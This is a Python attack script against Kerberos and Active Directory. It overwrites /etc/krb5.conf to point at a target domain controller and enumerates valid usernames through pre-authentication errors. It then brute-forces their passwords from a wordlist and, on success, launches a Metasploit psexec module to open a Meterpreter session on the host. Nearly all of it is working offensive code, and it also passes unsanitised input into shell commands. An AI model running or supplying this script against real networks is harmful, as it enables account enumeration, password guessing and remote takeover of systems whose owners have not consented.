import kerberos
import os
import sys

username_wordlist=sys.argv[1]
password_wordlist=sys.argv[2]
realm = sys.argv[3]
hostname = sys.argv[4]
port = 88


f = open("test.conf","a")
f.write('''\n\n[libdefaults]
	default_realm ='''+realm.upper()+'''
	dns_lookup_realm = false
	dns_lookup_kdc = false
	ticket_lifetime = 24h
	renew_lifetime = 7d
	forwardable = true

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true

# The following encryption type specification will be used by MIT Kerberos
# if uncommented.  In general, the defaults in the MIT Kerberos code are
# correct and overriding these specifications only serves to disable new
# encryption types as they are added, creating interoperability problems.
#
# The only time when you might need to uncomment these lines and change
# the enctypes is if you have local software that will break on ticket
# caches containing ticket encryption types it doesn't know about (such as
# old versions of Sun Java).

#	default_tgs_enctypes = des3-hmac-sha1
#	default_tkt_enctypes = des3-hmac-sha1
#	permitted_enctypes = des3-hmac-sha1

# The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]\n\n'''+
	
	'\t'+realm.upper()+''' = {
		kdc = '''+str(hostname)+':'+str(port)+'''
		admin_server = '''+str(hostname)+':'+str(port)+'''
	}
 ''')

f.close()
os.system("sudo mv test.conf /etc/krb5.conf")

service = "HTTP/%s" % hostname

username_list=[]
password_list=[]

with open(username_wordlist,encoding="utf-8",errors="ignore") as usernames_wordlist:
	usernames = usernames_wordlist.read().splitlines()
with open(password_wordlist,encoding="utf-8",errors="ignore") as passwords_wordlist:
	passwords = passwords_wordlist.read().splitlines()

for username in usernames:
	try:
		kerberos.checkPassword(username, "", service, realm.upper())
	except kerberos.BasicAuthError as error:
		if "Preauthentication failed" in error.__str__():
			print("User Found: "+username+"----> Pre-Auth")
			username_list.append(username)
		elif "Client not found" in error.__str__():
			continue

print("\n")
if len(username_list) > 0:
	print("Passwords Trying...\n")
	for username in username_list:
		for password in passwords:
			try:
				kerberos.checkPassword(username, password, service, realm.upper())
				print("Password Found ----> "+username+":"+password)
				password_list.append(password)
			except kerberos.BasicAuthError as error:
				if "Preauthentication failed" in error.__str__():
					continue
				elif "Preauthentication failed" not in error.__str__():
					continue
else:
	print("Users Not Found :(")


if len(username_list) > 0 and len(password_list) > 0:
	
	answer = input("\nTry to Get Meterpreter Session? (y/n): ")

	if answer == "y":
		print("\n")
		for i in range(0,len(username_list)):
			print(str(i+1)+"-) "+username_list[int(i)])



		user_choice = input("\nWhich One?: ")

		os.system("touch msf.rc")
		os.system("echo 'use windows/smb/psexec' > msf.rc")
		os.system("echo 'set rhosts '"+hostname+" >> msf.rc")
		os.system("echo 'set smbuser '"+username_list[int(user_choice)-1]+" >> msf.rc")
		os.system("echo 'set smbpass '"+password_list[int(user_choice)-1]+" >> msf.rc")
		os.system("echo 'set smbdomain '"+realm.lower()+" >> msf.rc")
		os.system("echo 'run' >> msf.rc")
		os.system("msfconsole -r msf.rc")
	else:
		print("\nGood Bye")
